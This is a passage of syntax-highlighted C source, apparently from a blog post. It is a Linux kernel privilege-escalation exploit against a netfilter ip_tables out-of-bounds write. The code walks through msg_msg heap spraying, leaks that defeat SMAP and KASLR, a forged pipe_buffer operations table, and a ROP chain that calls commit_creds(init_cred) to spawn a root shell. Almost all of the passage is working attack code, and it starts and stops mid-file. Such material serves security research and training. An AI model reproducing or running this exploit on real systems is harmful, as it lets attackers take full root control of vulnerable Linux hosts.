0x20</span></span><br><span class="line">  &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">  data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">  data.replace.size = (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) +</span><br><span class="line">                       <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target));             <span class="comment">// 0x70 + (0x108+0x1000-0x200-0x2) + 0x20 + 0x20 = 0xFB8 - 0x2</span></span><br><span class="line"></span><br><span class="line">  data.entry.next_offset = (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) +</span><br><span class="line">                            <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target));        <span class="comment">// Size of ipt_entry + matches + target</span></span><br><span class="line">  data.entry.target_offset =</span><br><span class="line">      (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad));         <span class="comment">// Size of ipt_entry + matches</span></span><br><span class="line"></span><br><span class="line">  data.match.u.user.match_size = (<span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad));   <span class="comment">// 0x20 + (0x108+0x1000-0x200-0x2) = 0xF28 - 0x2</span></span><br><span class="line">  <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">  data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);                     <span class="comment">// 0x20</span></span><br><span class="line">  <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">  data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Partially overwrite the adjacent buffer with 2 bytes of zero.</span></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (errno == ENOPROTOOPT) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Error ip_tables module is not loaded.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setup_sandbox</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//bind the cpu0</span></span><br><span class="line">  <span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">  CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">  CPU_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> s;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> pipefd[NUM_PIPEFDS][<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> msqid[NUM_MSQIDS];</span><br><span class="line">  <span class="keyword">uint64_t</span>    *rop_chain;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];</span><br><span class="line">  <span class="keyword">char</span> secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">fake_pipe_buffer_ops</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">fake_pipe_buffer</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> pipe_buffer_ops = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">uint64_t</span> kheap_addr = <span class="number">0</span>, kbase_addr = <span class="number">0</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> fake_idx = <span class="number">-1</span>, real_idx = <span class="number">-1</span>;</span><br><span class="line">  saveStatus();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 0: Initialization\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Setting up namespace sandbox...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (setup_sandbox() &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Initializing sockets and message queues...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] socket&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, ss[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] socketpair&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1. two bytes null write -&gt; UAF</span></span><br><span class="line"><span class="comment">// 1-1. gain 4096 msg queue</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | <span class="number">0666</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] msgget&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 1: Memory corruption\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">//1-2. create 4096 primary msg —— size=0x1000</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying primary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_primary, <span class="string">&#x27;\xdd&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_primary.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_primary.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;msg_primary, <span class="keyword">sizeof</span>(msg_primary), MTYPE_PRIMARY) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-3. create 4096 secondary msg —— size=0x400</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_secondary, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_secondary));</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary),</span><br><span class="line">                  MTYPE_SECONDARY) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-4. release #1024/#2048/#3072 msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Creating holes in primary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = HOLE_STEP; i &lt; NUM_MSQIDS; i += HOLE_STEP) &#123;</span><br><span class="line">    <span class="keyword">if</span> (read_msg(msqid[i], &amp;msg_primary, <span class="keyword">sizeof</span>(msg_primary), MTYPE_PRIMARY) &lt;</span><br><span class="line">        <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-5. make xt_table_info struct take up the hole, and triger 2 bytes null write</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering out-of-bounds write...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (trigger_oob_write(s) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1-6. find which msg is corrupted</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Searching for corrupted primary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; (i % HOLE_STEP) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[i], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">0</span>] != MSG_TAG) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not corrupt any primary message.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>] != i) &#123;</span><br><span class="line">      fake_idx = i;</span><br><span class="line">      real_idx = *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fake_idx == <span class="number">-1</span> &amp;&amp; real_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not corrupt any primary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_idx&#x27;s primary message has a corrupted next pointer; wrongly pointing to real_idx&#x27;s secondary message.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_idx: 0x%x\n&quot;</span>, fake_idx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] real_idx: 0x%x\n&quot;</span>, real_idx);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 2: SMAP bypass\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">// 2. leak secondary msg address (kmalloc-0x400) -&gt; to forge `msg_msg-&gt;m_list-&gt;next &amp; prev`</span></span><br><span class="line"><span class="comment">// 2-1. free overlapped msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing real secondary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read_msg(msqid[real_idx], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary),</span><br><span class="line">               MTYPE_SECONDARY) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reclaim the previously freed secondary message with a fake msg_msg of maximum possible size.</span></span><br><span class="line"><span class="comment">// 2-2. spray and forge msg_msg (forge larger msg_msg-&gt;m_ts)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, <span class="number">0x41414141</span>, <span class="number">0x42424242</span>,</span><br><span class="line">                PAGE_SIZE - MSG_MSG_SIZE, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 2-2. leak heap pointer `msg_msg-&gt;m_list-&gt;prev` (kmalloc-0x1000)</span></span><br><span class="line">  <span class="comment">// Use the fake secondary message to read out-of-bounds.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking adjacent secondary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (peek_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the leak is valid.</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not leak adjacent secondary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The secondary message contains a pointer to the primary message.</span></span><br><span class="line">  msg = (struct msg_msg *)&amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">  kheap_addr = msg-&gt;m_list_next;</span><br><span class="line">  <span class="keyword">if</span> (kheap_addr &amp; (PRIMARY_SIZE - <span class="number">1</span>))</span><br><span class="line">    kheap_addr = msg-&gt;m_list_prev;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kheap_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kheap_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kheap_addr &amp; <span class="number">0xFFFF000000000000</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel heap address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 2-3. leak heap pointer `msg_msg-&gt;m_list-&gt;prev` (kmalloc-0x400)  (forge msg_msg-&gt;next)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing fake secondary messages...\n&quot;</span>);</span><br><span class="line">  free_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Put kheap_addr at next to leak its content. Assumes zero bytes before</span></span><br><span class="line">  <span class="comment">// kheap_addr.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, <span class="number">0x41414141</span>, <span class="number">0x42424242</span>,</span><br><span class="line">                <span class="keyword">sizeof</span>(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);      <span class="comment">// fist 8 bytes must be NULL</span></span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use the fake secondary message to read from kheap_addr.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking primary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (peek_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the leak is valid.</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_fake.mtext[PAGE_SIZE] != MSG_TAG) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not leak primary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The primary message contains a pointer to the secondary message.</span></span><br><span class="line">  msg = (struct msg_msg *)&amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];</span><br><span class="line">  kheap_addr = msg-&gt;m_list_next;</span><br><span class="line">  <span class="keyword">if</span> (kheap_addr &amp; (SECONDARY_SIZE - <span class="number">1</span>))</span><br><span class="line">    kheap_addr = msg-&gt;m_list_prev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Calculate the address of the fake secondary message.</span></span><br><span class="line">  kheap_addr -= SECONDARY_SIZE;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kheap_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kheap_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kheap_addr &amp; <span class="number">0xFFFF00000000FFFF</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel heap address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 3. leak kernel base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 3: KASLR bypass\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing fake secondary messages...\n&quot;</span>);</span><br><span class="line">  free_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3-1. forge `msg_msg-&gt;m_list-&gt;next &amp; prev` so that list_del() does not crash.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, kheap_addr, kheap_addr, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 3-2. free secondary msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing sk_buff data buffer...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), MTYPE_FAKE) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 3-3. spray pipe_buffer object</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] pipe&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Write something to populate pipe_buffer.</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipefd[i][<span class="number">1</span>], <span class="string">&quot;pwn&quot;</span>, <span class="number">3</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] write&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 3-4. leak pipe_buffer-&gt;ops —— kernel base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking and freeing pipe_buffer object...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (read(ss[i][<span class="number">1</span>], secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] read&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_rmid;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)&amp;secondary_buf[<span class="number">0x10</span>] != MTYPE_FAKE)</span><br><span class="line">        pipe_buffer_ops = *(<span class="keyword">uint64_t</span> *)&amp;secondary_buf[<span class="number">0x10</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  kernel_offset = pipe_buffer_ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">  kbase_addr = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] anon_pipe_buf_ops: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, pipe_buffer_ops);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kbase_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kbase_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kbase_addr &amp; <span class="number">0xFFFF0000000FFFFF</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel base address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 4. hijack control-flow</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 4: Kernel code execution\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">// 4-1. use skb to forge fake pipe_buffer</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//hijack rsp</span></span><br><span class="line">  fake_pipe_buffer = (struct pipe_buffer *)&amp;secondary_buf;</span><br><span class="line">  fake_pipe_buffer-&gt;ops = kheap_addr;</span><br><span class="line">  </span><br><span class="line">  fake_pipe_buffer_ops = (struct pipe_buf_operations *)secondary_buf;</span><br><span class="line">  fake_pipe_buffer_ops-&gt;release = kernel_offset + PUSH_RSI_JMP_RSI_0x2E;                  <span class="comment">//</span></span><br><span class="line">  fake_pipe_buffer_ops-&gt;confirm = kernel_offset + ADD_RSP_0x98_RET;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> *mid_gadget;</span><br><span class="line">  mid_gadget = (<span class="keyword">uint64_t</span>*) (<span class="keyword">uint64_t</span>*) &amp;secondary_buf[<span class="number">0x2e</span>];</span><br><span class="line">  mid_gadget[<span class="number">0</span>] = kernel_offset + POP_RSP_RET;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4-2. construct ROP chain</span></span><br><span class="line">  <span class="comment">//build rop</span></span><br><span class="line">    <span class="keyword">int</span> rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span>*) &amp;secondary_buf[<span class="number">0xa0</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;PIG007XX&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;PIG007XX&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 4-3. trigger pipe_release()</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Releasing pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (close(pipefd[i][<span class="number">0</span>]) &lt; <span class="number">0</span>) 